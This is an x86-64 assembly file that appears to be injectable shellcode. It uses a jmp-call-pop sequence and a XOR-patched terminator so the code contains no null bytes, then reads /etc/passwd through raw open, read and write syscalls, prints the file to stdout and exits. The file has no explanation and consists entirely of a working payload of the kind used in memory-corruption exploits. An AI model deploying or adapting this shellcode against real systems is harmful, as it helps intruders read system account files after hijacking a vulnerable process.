global _start
section .text

_start:
	jmp _push_filename

_readfile:
	;syscall open file
	pop	rdi	;pop path value
	;NULL byte fix
	xor 	byte [rdi + 11], 0x41

	xor 	rax,	rax
	add	al,	2
	xor	rsi,	rsi
	syscall

	;syscall read file
	sub 	sp,	0xfff
	lea 	rsi,	[rsp]
	mov	rdi,	rax
	xor	rdx,	rdx
	mov	dx,	0xfff
	xor	rax,	rax
	syscall

	;syscall write to stdout
	xor	rdi,	rdi
	add	dil,	1
	mov	rdx,	rax
	xor	rax,	rax
	add	al,	1
	syscall

	;syscall exit
	xor 	rax,	rax
	add 	al,	60
	syscall

_push_filename:
	call _readfile
	path: db "/etc/passwdA"
